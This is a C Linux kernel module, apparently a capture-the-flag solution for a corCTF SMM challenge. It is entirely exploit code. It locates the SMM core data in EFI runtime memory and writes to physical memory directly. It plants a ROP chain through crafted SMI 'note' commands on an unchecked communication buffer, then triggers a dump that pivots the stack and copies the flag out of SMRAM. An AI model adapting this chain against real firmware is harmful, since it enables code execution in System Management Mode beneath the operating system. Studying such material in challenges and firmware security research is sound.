#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/acpi.h>
#include <linux/efi.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HaxHax");
MODULE_DESCRIPTION("A simple Linux module.");
MODULE_VERSION("0.01");

#define EFI_CORCTF_SMM_PROTOCOL_GUID \
    { 0xb888a84d, 0x3888, 0x480e, { 0x95, 0x83, 0x81, 0x37, 0x25, 0xfd, 0x39, 0x8b } }

#define ADD_NOTE 0x1337
#define GET_NOTE 0x1338
#define DUMP_NOTES 0x31337

#define SMBASE 0x7FFAF000

typedef struct
{
    uint8_t note[16];
}diary_note;

typedef struct
{
    uint32_t cmd;
    uint32_t idx;
    union transfer_data
    {
        diary_note note;
        uint8_t *dest;
    } data;
}comm_data_t;

#define CHUNK_SIZE (4096)

u64 _find_smmc(u64 start, u64 end) {
    printk(KERN_INFO "_find_smmc, start: %llx, end: %llx \n", start, end);
    u64 addr = start;
    void *vaddr;
    //char target[] = "smmc";
    u32 target = cpu_to_le32(*(u32*)"smmc");
    unsigned long size = end - start;
    void *mapped_start;

    mapped_start = ioremap(start, size);
    if (!mapped_start) {
        printk(KERN_ERR "ioremap failed for address range %llx to %llx\n", start, end);
        return 0;
    }

    while (addr < end) {
        vaddr = mapped_start + (addr - start);
        if (*(u32*)vaddr == target) {  // compare 4-byte chunks as u32
            iounmap(mapped_start);
            return addr;
        }
        addr += sizeof(target);
    }
    iounmap(mapped_start);
    return 0;
}

// EFI_RUNTIME_SERVICES_DATA
u64 find_data_reg(void) {
    efi_memory_desc_t *md;
    u64 addr = 0;
    u64 size, mmio_start, mmio_end;

    for_each_efi_memory_desc(md) {
        if (md->type == EFI_RUNTIME_SERVICES_DATA) {
            size = md->num_pages << EFI_PAGE_SHIFT;
            mmio_start = md->phys_addr;
            mmio_end = mmio_start + size;

            return mmio_start;
        }
    }

    return 0;
}

// EFI_RUNTIME_SERVICES_CODE
static u64 find_smm_core_private_data(void)
{
    efi_memory_desc_t *md;
    u64 addr = 0;
    u64 size, mmio_start, mmio_end;

    for_each_efi_memory_desc(md) {
        if (md->type == EFI_RUNTIME_SERVICES_CODE) {
            size = md->num_pages << EFI_PAGE_SHIFT;
            mmio_start = md->phys_addr;
            mmio_end = mmio_start + size;

            addr = _find_smmc(mmio_start, mmio_end);
            if (addr) {
                break;
            }
        }
    }

    return addr;
}

void write_phys_mem(unsigned long phys_addr, size_t size, const void *data) {
    void __iomem *io_addr;

    // Map the physical address to a virtual address
    io_addr = ioremap(phys_addr, size);
    if (!io_addr) {
        pr_err("Failed to remap physical address %lx\n", phys_addr);
        return;
    }

    // Write the data
    memcpy_toio(io_addr, data, size);

    // Unmap the address
    iounmap(io_addr);
}

int read_phys_mem(unsigned long phys_addr, size_t size, const void *data) {
    void __iomem *io_addr;

    // Map the physical address to a virtual address
    io_addr = ioremap(phys_addr, size);
    if (!io_addr) {
        pr_err("Failed to remap physical address %lx\n", phys_addr);
        return -1;
    }

    // Write the data
    memcpy_fromio(data,io_addr, size);

    // Unmap the address
    iounmap(io_addr);
    return 0;
}

u64 payload_loc;
u64 smcc;
void __iomem* io_addr;
efi_guid_t target_guid = EFI_GUID(0xb888a84d, 0x3888, 0x480e, 0x95, 0x83, 0x81, 0x37, 0x25, 0xfd, 0x39, 0x8b);

static void add_note(uint32_t idx, char* data) {
    comm_data_t payload;
    payload.cmd = ADD_NOTE;
    payload.idx = idx;
    size_t len = sizeof(payload) + 24;
    memcpy(payload.data.note.note, data, sizeof(payload.data.note.note));

    u64 combuf_off = 56;
    u64 buffersz_off = combuf_off + 8;
    u64 ret_off = buffersz_off + 8;

    write_phys_mem(smcc + combuf_off, 8, &payload_loc);
    write_phys_mem(smcc + buffersz_off, 8, &len);

    memcpy_toio(io_addr, &target_guid, sizeof(efi_guid_t));
    memcpy_toio(io_addr + sizeof(efi_guid_t), &len, sizeof(size_t));
    memcpy_toio(io_addr + sizeof(efi_guid_t) + sizeof(size_t), &payload, sizeof(comm_data_t));

    printk(KERN_INFO "Triggering OUT SMI for idx: %d \n", idx);

    outb(0x0, 0xb2);
}

static void dump_notes(uint64_t dest) {
    comm_data_t payload;
    payload.cmd = DUMP_NOTES;
    payload.data.dest = dest;
    size_t len = sizeof(payload) + 24;

    u64 combuf_off = 56;
    u64 buffersz_off = combuf_off + 8;
    u64 ret_off = buffersz_off + 8;

    write_phys_mem(smcc + combuf_off, 8, &payload_loc);
    write_phys_mem(smcc + buffersz_off, 8, &len);

    memcpy_toio(io_addr, &target_guid, sizeof(efi_guid_t));
    memcpy_toio(io_addr + sizeof(efi_guid_t), &len, sizeof(size_t));
    memcpy_toio(io_addr + sizeof(efi_guid_t) + sizeof(size_t), &payload, sizeof(comm_data_t));

    printk(KERN_INFO "Triggering dump SMI \n");

    outb(0x0, 0xb2);
}

static void get_note(uint32_t idx, char* data) {
    comm_data_t payload;
    payload.cmd = GET_NOTE;
    payload.idx = idx;
    size_t len = sizeof(payload) + 24;

    u64 combuf_off = 56;
    u64 buffersz_off = combuf_off + 8;
    u64 ret_off = buffersz_off + 8;

    write_phys_mem(smcc + combuf_off, 8, &payload_loc);
    write_phys_mem(smcc + buffersz_off, 8, &len);

    memcpy_toio(io_addr, &target_guid, sizeof(efi_guid_t));
    memcpy_toio(io_addr + sizeof(efi_guid_t), &len, sizeof(size_t));
    memcpy_toio(io_addr + sizeof(efi_guid_t) + sizeof(size_t), &payload, sizeof(comm_data_t));

    printk(KERN_INFO "Triggering IN SMI \n");

    outb(0x0, 0xb2);

    comm_data_t out;

    memcpy_fromio(&out, io_addr + sizeof(efi_guid_t) + sizeof(size_t), sizeof(comm_data_t));

    memcpy(data, out.data.note.note, sizeof(out.data.note.note));
}

static void dump_buf(void *buf, size_t sz)
{
    uint64_t* p_buf = (uint64_t*)buf;
    int i;
    for (i = 0; i < sz / 8; i++) {
        printk(KERN_INFO "%llx\n",p_buf[i]);
    }
}

static int do_exp(void)
{
    printk(KERN_INFO "do_exp called \n");
    smcc = find_smm_core_private_data();

    payload_loc = find_data_reg();

    if (!payload_loc) {
        printk(KERN_INFO "to find payload loc\n");
        return -1;
    }

    // Map the physical address to a virtual address
    io_addr = ioremap(payload_loc, PAGE_SIZE);
    if (!io_addr) {
        pr_err("unable to map payload loc %lx\n", payload_loc);
        return -1;
    }

    if (smcc == 0) {
        printk(KERN_INFO "unable to find smcc\n");
        return -1;
    }

    printk(KERN_INFO "smmc addr: %llx \n", smcc);

    uint64_t module_base = 0x0007FF9C000;
    uint64_t flag_addr = 0x7ff9ebbc;
    uint64_t copy_mem_addr = 0x7ff9dd26;
    uint64_t nop = module_base + 0x1e6e;
    uint64_t pop_r12_r13_ret = module_base + 0x1d43;
    uint64_t pop_rbx_ret = module_base + 0x10e1;
    uint64_t pop_rsp_r13_ret = module_base + 0x1d44;

    uint64_t chain[] = {
        pop_r12_r13_ret,
        payload_loc,
        flag_addr,
        pop_rbx_ret,
        0x40,
        copy_mem_addr,
        0x41,
        0x41,
        0x41,
        0x41,
        pop_rsp_r13_ret,
        0x7ffb6c90, // rsp of an intact stack-frame
    };

    char note[0x10];
    uint64_t *p_note = (uint64_t*)note;

    int idx = 0x0;
    int i;
    for (i = 0; i < 0x1; i++) {
        p_note[0] = nop;
        p_note[1] = nop;

        add_note(idx++, note);
    }

    for (i = 0; i < sizeof(chain) / sizeof(uint64_t); i+= 2) {
        p_note[0] = chain[i];
        p_note[1] = chain[i + 1];

        add_note(idx++, note);
    }

    uint64_t rsp = 0x7ffb6ab0;
    dump_notes(rsp);

    char flag[0x40];
    memcpy_fromio(&flag, io_addr, sizeof(flag));
    printk(KERN_INFO "Flag: %s \n", flag);

    return 0;
}

static int __init hello_init(void) {
 printk(KERN_INFO "Exploit module loaded\n");
 return do_exp();
}

static void __exit hello_exit(void) {
 printk(KERN_INFO "Exploit module unloaded\n");
}

module_init(hello_init);
module_exit(hello_exit);

// corctf{uNch3CKeD_c0Mm_BufF3r:(}

